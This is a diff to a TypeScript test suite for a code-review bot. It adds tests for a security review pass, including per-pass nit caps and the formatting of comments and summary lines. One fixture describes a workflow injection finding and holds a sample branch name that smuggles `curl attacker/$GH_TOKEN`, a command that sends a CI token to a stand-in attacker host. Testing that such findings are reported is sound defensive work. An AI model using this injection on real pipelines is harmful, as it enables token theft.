@@ -75,6 +75,12 @@ const finding = (severity: ReportedFinding["severity"], file: string, line: numb
   summary: `${severity} at ${file}`,
   failureScenario: "the scenario",
   breaks: null,
+  pass: "code",
+});
+
+const secured = (severity: ReportedFinding["severity"], file: string, line: number | null): ReportedFinding => ({
+  ...finding(severity, file, line),
+  pass: "security",
 });
 
 describe("diffArgsOf", () => {
@@ -154,6 +160,31 @@ describe("postPlanOf", () => {
     ]);
     expect(plan.preExisting).toBe(2);
   });
+
+  test("the Nit cap holds per pass: the first three of the Code review's, and the first three of the security pass's", () => {
+    const plan = postPlanOf(
+      [
+        ...[120, 121, 122, 123].map((line) => finding("nit", "app/a.ts", line)),
+        finding("important", "b.ts", 1),
+        ...[120, 121, 122, 123].map((line) => secured("nit", "app/a.ts", line)),
+        secured("important", "b.ts", 1),
+        secured("pre_existing", "b.ts", 1),
+      ],
+      LINES,
+    );
+
+    expect(plan.comments.map((planned) => [planned.severity, planned.finding.pass, planned.anchor.line])).toEqual([
+      ["important", "code", 1],
+      ["important", "security", 1],
+      ["nit", "code", 120],
+      ["nit", "code", 121],
+      ["nit", "code", 122],
+      ["nit", "security", 120],
+      ["nit", "security", 121],
+      ["nit", "security", 122],
+    ]);
+    expect(plan.preExisting).toBe(1);
+  });
 });
 
 const REQUEST = {
@@ -164,6 +195,7 @@ const REQUEST = {
   round: 2 as const,
   model: "sonnet",
   effort: "medium" as const,
+  security: false,
 };
 
 const resultOf = (...findings: ReportedFinding[]): ReportedResult => ({
@@ -179,6 +211,18 @@ const resultOf = (...findings: ReportedFinding[]): ReportedResult => ({
 const PostedComments = Schema.Array(
   Schema.Struct({ path: Schema.String, line: Schema.Int, side: Schema.String, body: Schema.String }),
 );
+
+/** A Review round 1 at high effort that ran a security pass. */
+const withPass = (...findings: ReportedFinding[]): ReportedResult => ({
+  ...resultOf(...findings),
+  model: "claude-opus-5-5",
+  request: { ...REQUEST, round: 1, effort: "high", security: true },
+});
+
+const firstLine = (posted: ReportedResult): string | undefined =>
+  Schema.decodeUnknownSync(Schema.String)(
+    reviewOf(postPlanOf(posted.report.findings, LINES), posted, "c")["body"],
+  ).split("\n")[0];
 
 const commentsOf = (...findings: ReportedFinding[]): typeof PostedComments.Type =>
   Schema.decodeUnknownSync(PostedComments)(
@@ -261,6 +305,59 @@ describe("reviewOf", () => {
       "Review round 2 (sonnet, /code-review medium): nothing to fix.\n",
     );
     expect(reviewOf(postPlanOf([], LINES), result, "c")["comments"]).toEqual([]);
+  });
+
+  test("a security finding's comment names its pass after its severity, and keeps the severity's marker", () => {
+    const leak = {
+      ...secured("important", ".github/workflows/code-review.yml", 70),
+      summary:
+        "The dispatched `inputs.head` is written into a `run:` script line, so a crafted branch name runs in the job next to its token.",
+      failureScenario:
+        "A PR whose head ref is `x\"; curl attacker/$GH_TOKEN; \"`: the review job's shell runs it with the job's token in its environment.",
+      breaks: { file: ".github/workflows/code-review.yml", line: 70 },
+    };
+
+    const lines: DiffLines = new Map([
+      [".github/workflows/code-review.yml", new Set([70])],
+      ["b.ts", new Set([1])],
+    ]);
+
+    const result = { ...resultOf(leak), request: { ...REQUEST, security: true } };
+    const plan = postPlanOf([leak, secured("nit", "b.ts", 1)], lines);
+
+    const bodies = Schema.decodeUnknownSync(PostedComments)(reviewOf(plan, result, "c")["comments"]).map(
+      (comment) => comment.body,
+    );
+
+    expect(bodies).toEqual([
+      [
+        "**Important (security)**: The dispatched `inputs.head` is written into a `run:` script line, so a crafted branch name runs in the job next to its token.",
+        "Breaks: `.github/workflows/code-review.yml:70`",
+        "",
+        "A PR whose head ref is `x\"; curl attacker/$GH_TOKEN; \"`: the review job's shell runs it with the job's token in its environment.",
+        "",
+        "<!-- lab-finding severity=important -->",
+      ].join("\n"),
+      `**Nit (security)**: nit at b.ts\n\nthe scenario\n\n${markerOf("nit")}`,
+    ]);
+  });
+
+  test("with a security pass, the body counts each pass's findings apart; with nothing posted by either, nothing to fix", () => {
+    const result = withPass(
+      finding("important", "b.ts", 1),
+      finding("nit", "b.ts", 1),
+      finding("nit", "b.ts", 1),
+      secured("important", "b.ts", 1),
+      secured("pre_existing", "b.ts", 1),
+    );
+
+    expect(firstLine(result)).toBe(
+      "Review round 1 (claude-opus-5-5, /code-review high): 1 important, 2 nit; security: 1 important, 0 nit. 1 pre-existing finding(s) not posted.",
+    );
+    expect(firstLine(withPass(secured("nit", "b.ts", 1)))).toBe(
+      "Review round 1 (claude-opus-5-5, /code-review high): 0 important, 0 nit; security: 0 important, 1 nit.",
+    );
+    expect(firstLine(withPass())).toBe("Review round 1 (claude-opus-5-5, /code-review high): nothing to fix.");
   });
 });
 
